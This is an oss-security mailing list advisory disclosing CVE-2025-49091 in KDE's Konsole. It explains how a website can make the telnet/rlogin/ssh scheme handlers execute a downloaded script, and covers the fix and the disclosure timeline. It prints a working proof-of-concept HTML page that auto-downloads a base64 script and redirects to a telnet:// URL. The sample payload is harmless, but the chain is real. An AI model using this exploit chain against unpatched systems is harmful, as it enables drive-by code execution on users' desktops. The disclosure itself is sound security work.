Received: (qmail 5663 invoked by uid 550); 10 Jun 2025 17:58:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 15781 invoked from network); 10 Jun 2025 17:45:36 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=proofnet.de;
	s=kas202502081007; t=1749577525;
	bh=ooHPFSYaATEWSQnu3fXAPmNnGtOETjV8bnJUcVgTf3A=;
	h=Date:From:To:Subject:From;
	b=Lc7hYBp4jcitq4nZbIkGlcZAsTVlUp3A9Zo0VEIFKTqLJOUF+hUdBB1/wk2ICP/4W
	 CUniSuarW8J+VAfevQYXmuQqVok5qyMmYze1wZzcVMDcInqf1GYVggjCf36Z9kieLq
	 kYoFIulUBS1pumF/QjY+NGraaNj7uAvpEYF4ZoVX2n9Ncnpg/U60pEVuLo4MA+J8w9
	 nnPJU6StTO8lxc4f3hSvBlJtlolE4F5+T2PGKOal0WgBDkFBwb67ahXBDQG0Zx+0C7
	 VJMAFi9X8uJ9SQl6CoFdKqkIBcTpphQJ202Vhg2r+mbhDgcL8UqKvIXCuWbVQyLtmD
	 35r+r834jdyCg==
Date: Tue, 10 Jun 2025 19:45:24 +0200
From: Dennis Dast <dennis.dast@proofnet.de>
To: oss-security@lists.openwall.com
Message-ID: <aEhvNIJLMqKGCYqY@proofnet>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
Subject: [oss-security] CVE-2025-49091: Konsole: Code execution from web browser using URL schemes
 handled by KDE's KTelnetService and Konsole < 25.04.2

Code execution from web browser using URL schemes handled by KDE's KTelnetService and Konsole
=============================================================================================

Abstract
--------

This issue affects systems where KTelnetService and a vulnerable version
of Konsole are installed but at least one of the programs telnet, rlogin
or ssh is not installed.  The vulnerability is in KDE's terminal
emulator Konsole [1].  As stated in the advisory by KDE [2], Konsole
versions < 25.04.2 are vulnerable.

On vulnerable systems remote code execution from a visited website is
possible if the user allows loading of certain URL schemes (telnet://,
rlogin:// or ssh://) in their web browser.  Depending on the web browser
and configuration this, e.g., means accepting a prompt in the browser.

CVE-2025-49091 was assigned for this issue.

This finding was inspired by an article published in April 2025 about an
arbitrary file read vulnerability in Yelp [3] that can be triggered from
a website loaded in the browser if the user allows loading of a special
URL (ghelp://).  By checking which other scheme handlers are installed
on our Linux desktops we found this attack on KDE software.

[1] https://invent.kde.org/utilities/konsole
[2] https://kde.org/info/security/advisory-20250609-1.txt
[3] https://blogs.gnome.org/mcatanzaro/2025/04/15/dangerous-arbitrary-file-read-vulnerability-in-yelp-cve-2025-3155/


Description
-----------

To reproduce the issue we need a system where KTelnetService and Konsole
< 25.04.2 is installed but at least one of the programs telnet, rlogin
or ssh is not installed.  When we found this issue (2025-04-16) this was
the case in the default installation of Fedora KDE Plasma Desktop 42
where both telnet and rlogin are missing and Konsole 24.12.3 was
installed.

To explain the issue we go through a proof of concept step by step.  For
the first step load the following website in Firefox:

    <html>
    <head>
        <script type="text/javascript">

        function downloadAndRedirect() {
            const anchor = document.createElement('a');
            anchor.href = "data:;base64,ZWNobyAiSGVsbG8gd29ybGQiCnRvdWNoIC90bXAvZm9vYmFyCg==";
            anchor.download = 'evil';
            document.body.appendChild(anchor);
            anchor.click();
            document.body.removeChild(anchor);

            setTimeout(() => {
                window.location.href = "telnet:///proc/self/cwd/Downloads/evil";
            }, 1000);
        }
        </script>
    </head>
    <body onload="downloadAndRedirect()">
    </body>
    </html>

This will download a file to ~/Downloads/evil (the default configuration
of Firefox will automatically store the file without asking the user)
with the following content:

    echo "Hello world"
    touch /tmp/foobar

After the download the website redirects to:

    telnet:///proc/self/cwd/Downloads/evil

KTelnetService has registered a telnet, rlogin and ssh scheme handler in
/usr/share/applications/ktelnetservice6.desktop:

    [Desktop Entry]
    Type=Application
    Exec=ktelnetservice6 %u
    Icon=utilities-terminal
    MimeType=x-scheme-handler/telnet;x-scheme-handler/rlogin;x-scheme-handler/ssh;

    NoDisplay=true

    Name=KTelnetService
    [...]

Therefore, Firefox will ask "Allow this site to open the telnet link
with KTelnetService?".

If the user clicks "Open Link", KTelnetService will run the following:

    /usr/bin/konsole --noclose -e telnet /proc/self/cwd/Downloads/evil

However, since telnet is not installed Konsole will instead fall back to
executing "/bin/bash" but still with the argument
"/proc/self/cwd/Downloads/evil".  This means the previously downloaded
script is executed.  This can be seen in the opened Konsole window
which shows:

    Warning: Could not find 'telnet', starting '/bin/bash' instead.  Please check your profile settings.

    Hello world

As expected "/tmp/foobar" is created, showing that arbitrary code
execution is possible.


Fix in Konsole 25.04.2
----------------------

This was fixed in Konsole 25.04.2 by commit 09d20dea [4] which clears
the arguments in case the command is not found by Konsole.  That means
if telnet, rlogin or ssh is not found Konsole will no longer execute
"/bin/bash /proc/self/cwd/Downloads/evil".  Instead the argument is
cleared and only "/bin/bash" is executed.

[4] https://invent.kde.org/utilities/konsole/-/commit/09d20dea109050b4c02fb73095f327b5642a2b75


Timeline
--------

Reporting the issue to the KDE security team worked without any
difficulty.

2025-04-16: Issue reported to security@kde.org
2025-04-16: Report acknowledged by the KDE security team
2025-05-12: KDE security team confirmed the exploit and confirmed that fixes are in preparation
2025-06-05: KDE security team informed us that the issue was fixed and will be made public
2025-06-09: KDE Security Advisory was published (https://kde.org/info/security/advisory-20250609-1.txt)
2025-06-10: Write-up was published (https://proofnet.de/publikationen/konsole_rce.html)


Publication
-----------

https://proofnet.de/publikationen/konsole_rce.html

-- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Dennis Dast
Mail: dennis.dast@proofnet.de

proofnet GmbH
Embedded Security Services
Otto-Lilienthal-Str. 36
71034 Böblingen

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Geschäftsführer: Susanne Goldammer, Roman Schmidt
Sitz der Gesellschaft: Böblingen
Registergericht: Amtsgericht Stuttgart HRB 751556
Steuernummer: 56/464/03076

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
